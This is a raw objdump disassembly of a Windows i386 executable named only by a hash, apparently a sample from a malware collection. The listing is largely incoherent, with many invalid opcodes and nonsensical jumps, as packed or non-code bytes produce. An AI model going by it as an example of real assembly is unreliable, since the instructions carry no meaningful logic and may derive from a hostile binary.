
33aab1cea00b64171eb0953d8227bf1157122108e75a72ac21f3e8d4e0a79987.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
